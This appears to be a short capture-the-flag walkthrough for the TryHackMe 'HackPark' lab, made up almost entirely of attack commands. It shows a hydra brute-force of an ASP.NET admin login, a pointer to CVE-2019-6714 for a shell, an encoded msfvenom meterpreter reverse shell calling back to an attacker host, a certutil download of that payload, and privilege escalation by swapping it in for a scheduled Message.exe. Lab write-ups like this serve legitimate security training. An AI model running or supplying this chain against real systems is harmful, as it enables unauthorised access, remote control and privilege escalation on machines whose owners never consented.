Login through the website

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form '/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=uPTJxxYwftf0jbyFMp5yWDEDFAGD2FPskHKP1AQNb%2BcdVqKOz0kpQ%2FibM0AQdHVVw24RbIyhP9w1prs24w8bzO72rIAGMIl%2F9VtUNs%2BGjzGiY1Z2PhJWWZJmwfNxZD9tcbCd6rbtMABFMQMT0arOMH64supROr0gDGtmL3Us%2F6c9UGjAAgBN3DDNheHg6rrhkzZbxuPiW42%2Bulg5G%2F4YT%2FLrtatlDaWXcZS0%2Bkh4g8oO7%2B%2F9%2FxpPbyMMRHKPlCmvGMA80zhoAk35yHvWioHpvV46M4Zg2eQwKHXvSxfr4pJbezRs%2FfiSTgMpUNI3T3fSO3TLGpEFd6oAcG1Tc%2FIl7wd5dHRY9xQiSZzbRcqtq1TDdfAQ&__EVENTVALIDATION=xpNWEr%2FxHl6wyNirAaCfc07XZr5nskp4DksHN5Aa80BZEAUYUOMfTFBO8zTx3SKiRqkyRUe2hIOf6IhlPiC03cFu%2Bv5kdR%2FyEEPNUUj3jQte11p0vQXxVYl5yIEqm7YDuebynpB4bLAVDiz4DLFpnl3m7h9wk%2Bw0SqoWkGrvGvyWVzIR&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed'
```

Use CVE-2019-6714 (PostView.ascx) and follow the steps to get shell

make reverse shell

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<ip> LPORT=1234 -f exe -o bytekage.exe
```

```
certutil.exe -urlcache -split -f "http://<ip>:8000/try-hack-me/offensive-pen-testing/HackPark/bytekage.exe"
```

find the Message.exe runs ever 30 seconds

rename you shell from msfvenom to Message.exe and put it in the right directory within Program File (x86)

this will pop and root shell for you

to find the install time run

```systeminfo | findstr /i date```
